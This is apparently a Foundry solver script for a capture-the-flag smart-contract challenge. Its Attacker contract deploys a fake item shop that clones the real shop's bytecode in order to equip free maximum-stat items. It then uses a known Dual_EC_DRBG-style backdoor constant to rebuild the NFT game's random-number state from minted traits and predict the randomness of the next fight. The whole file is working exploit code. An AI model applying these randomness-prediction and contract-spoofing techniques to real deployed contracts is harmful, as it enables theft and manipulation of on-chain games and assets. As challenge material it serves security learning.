// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "forge-ctf/CTFSolver.sol";

import "@openzeppelin/token/ERC721/IERC721.sol";
import "@openzeppelin-upgradeable/token/ERC1155/IERC1155ReceiverUpgradeable.sol";

import "src/Randomness.sol";
import "src/Factory.sol";
import "src/NFT.sol";
import "src/Challenge.sol";
import "src/OwnedUpgradeable.sol";
import "src/Interfaces.sol";
import "src/ItemShop.sol";

contract FakeItemShop is ItemShop {
    // just mimic the layout of `ItemShop`: Done by inheriting from `ItemShop`

    constructor(address runtimeCodeToCopy) {
        uint256 counter = 0;
        _itemInfo[++counter] =
            ItemInfo({name: "Fake Sword", slot: EquipmentSlot.Weapon, value: type(uint40).max, price: 0});
        _mint(address(this), counter, 1, "");

        _itemInfo[++counter] =
            ItemInfo({name: "Fake Shield", slot: EquipmentSlot.Shield, value: type(uint40).max, price: 0});
        _mint(address(this), counter, 1, "");

        // use the exact same bytecode as the real ItemShop
        bytes memory code = address(runtimeCodeToCopy).code;
        assembly {
            return(add(code, 0x20), mload(code))
        }
    }
}

contract Attacker {
    Factory internal immutable factory;
    NFT internal immutable nft;
    Randomness public immutable randomness;
    FakeItemShop public immutable fakeItemShop;
    address internal immutable me;
    uint256 numCallbacks = 0;
    uint256 lastRound_tPx = 0; // t*P.x value of last round

    error AttackerError();
    error LegendreSymbol(uint256 l);

    constructor(Factory factory_, NFT nft_) {
        me = msg.sender;
        factory = Factory(factory_);
        nft = NFT(nft_);
        randomness = Randomness(address(nft.randomness()));
        address itemShopImplementation = factory.latestItemShopVersion();
        fakeItemShop = FakeItemShop(address(new FakeItemShop(itemShopImplementation)));
    }

    function attack() external {
        uint256 tokenId = nft.tokenOfOwnerByIndex(address(this), 0); // get previous NFT id

        // mint and equip items
        fakeItemShop.buy{value: 0}(1);
        fakeItemShop.buy{value: 0}(2);
        fakeItemShop.setApprovalForAll(address(nft), true);
        nft.equip(tokenId, address(fakeItemShop), 1);
        nft.equip(tokenId, address(fakeItemShop), 2);

        // schedule fight, prepend mint so we can predict randomness for fight
        address[] memory receivers = new address[](1);
        receivers[0] = address(this);
        nft.batchMint(receivers);
        nft.fight(uint128(tokenId), 0);
    }

    function ecMul(uint256 x, uint256 y, uint256 scalar) internal view returns (uint256[2] memory output) {
        uint256[3] memory input;
        input[0] = x;
        input[1] = y;
        input[2] = scalar;
        assembly {
            if iszero(staticcall(gas(), 0x07, input, 0x60, output, 0x40)) { revert(0, 0) }
        }
    }

    // https://github.com/witnet/elliptic-curve-solidity/blob/master/contracts/EllipticCurve.sol
    uint256 private constant U255_MAX_PLUS_1 =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function expMod(uint256 _base, uint256 _exp, uint256 _pp) internal pure returns (uint256) {
        require(_pp != 0, "Modulus is zero");

        if (_base == 0) {
            return 0;
        }
        if (_exp == 0) {
            return 1;
        }

        uint256 r = 1;
        uint256 bit = U255_MAX_PLUS_1;
        assembly {
            for {} gt(bit, 0) {} {
                r := mulmod(mulmod(r, r, _pp), exp(_base, iszero(iszero(and(_exp, bit)))), _pp)
                r := mulmod(mulmod(r, r, _pp), exp(_base, iszero(iszero(and(_exp, div(bit, 2))))), _pp)
                r := mulmod(mulmod(r, r, _pp), exp(_base, iszero(iszero(and(_exp, div(bit, 4))))), _pp)
                r := mulmod(mulmod(r, r, _pp), exp(_base, iszero(iszero(and(_exp, div(bit, 8))))), _pp)
                bit := div(bit, 16)
            }
        }

        return r;
    }

    uint256 public constant fieldOrder =
        uint256(21888242871839275222246405745257275088696311157297823662689037894645226208583);
    uint256 public constant groupOrder =
        uint256(21888242871839275222246405745257275088548364400416034343698204186575808495617);

    function ecGetY(uint256 _x) internal pure returns (uint256 y) {
        // Y^2 = X^3 + 3
        uint256 ySquared = addmod(mulmod(_x, mulmod(_x, _x, fieldOrder), fieldOrder), 3, fieldOrder);

        uint256 legendreSymbol = expMod(ySquared, (fieldOrder - 1) / 2, fieldOrder);
        if (legendreSymbol != 1) revert LegendreSymbol(legendreSymbol);

        // this computes the square root. works in fields where fieldOrder % 4 == 3. https://math.stackexchange.com/questions/1273690/when-p-3-pmod-4-show-that-ap1-4-pmod-p-is-a-square-root-of-a
        y = expMod(ySquared, (fieldOrder + 1) / 4, fieldOrder);
        // uint256 y2 = fieldOrder - y;
        // y = y2;
    }

    // this abuses us knowing the discrete log k of Q = k*P, the backdoor in DUAL_EC_DRBG.
    function _reconstructPrngInternals(uint256 firstMintTokenId) internal {
        Trait memory trait = nft.traits(firstMintTokenId);
        // observed traits correspond to PRNG's last round output. which is the x coordinate of A := sQ
        uint256 lastRoundOutput = uint256(trait.rarity) | uint256(trait.strength) << 16 | uint256(trait.dexterity) << 56
            | uint256(trait.constitution) << 96 | uint256(trait.intelligence) << 136 | uint256(trait.wisdom) << 176
            | uint256(trait.charisma) << 216;
        console2.log("reconstructed 256-bit lastRoundOutput", lastRoundOutput);
        console2.logBytes32(bytes32(lastRoundOutput));

        // attacker computes t'P = sP = sk^-1Q = k^-1 sQ = k^-1 A where A is the first output they observed.
        // k^-1 = inverse mod groupOrder
        uint256 A_x = lastRoundOutput;
        // it doesn't matter for the next PRNG round which one of the two y coordinates we pick.
        uint256 A_y = ecGetY(A_x);
        console2.log("reconstructed A_y", A_y);
        // discrete log k of Q = k*P. Q = r'G, P = rG
        // r'G = (r'*r^-1)rG => k = r'*r^-1
        uint256 kInv = 0x200ac28172d3dfaf595636a5d34fc6a98f3168b32317278ab95d95792e3b4f8f;
        uint256[2] memory tPrimeP = ecMul(A_x, A_y, kInv);
        console2.log("reconstructed k^-1 * A = t'P", tPrimeP[0]);
        lastRound_tPx = tPrimeP[0];
    }

    function getInput(FighterVars calldata, FighterVars calldata) external returns (uint256 inputs) {
        // having reconstructed t'P, the start of the second round, we finish the round by computing s' * Q = t'P.x * Q
        uint256 s = lastRound_tPx;
        uint256[2] memory sQ = ecMul(randomness.Qx(), randomness.Qy(), s);
        uint256 nextRoundOutput = sQ[0];
        uint256[2] memory tPrimeP = ecMul(randomness.Px(), randomness.Py(), s);
        lastRound_tPx = tPrimeP[0];
        console2.log("reconstructed nextRoundOutput", nextRoundOutput);
        console2.logBytes32(bytes32(nextRoundOutput));
        return ~nextRoundOutput;
    }

    function onERC721Received(address, address, uint256 tokenId, bytes memory) public virtual returns (bytes4) {
        if (msg.sender != address(nft)) revert AttackerError();
        numCallbacks++;
        if (numCallbacks == 2) {
            // we need to solve this in a single transaction as the seed changes for every batchMint
            // however, we can't just read the seed from `nft.lastOffchainSeed` as it's private
            // we need to recompute the PRNG's internal state after the first round, then predict the second round
            _reconstructPrngInternals(tokenId);
        }
        return this.onERC721Received.selector;
    }

    // to receive items from item shop
    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC1155ReceiverUpgradeable.onERC1155Received.selector;
    }
}

contract Solve1 is CTFSolver {
    function solve(address challenge_, address) internal override {
        Challenge challenge = Challenge(challenge_);

        NFT nft = challenge.TOKEN();
        Factory factory = challenge.FACTORY();

        Attacker attacker = new Attacker(factory, nft);
        // mint 1 NFT
        address[] memory receivers = new address[](1);
        receivers[0] = address(attacker);
        nft.batchMint(receivers);
    }
}

contract Solve2 is CTFSolver {
    function solve(address challenge_, address) internal override {
        Challenge challenge = Challenge(challenge_);

        Attacker attacker = Attacker(challenge.TOKEN().ownerOf(1));

        attacker.attack();
    }
}
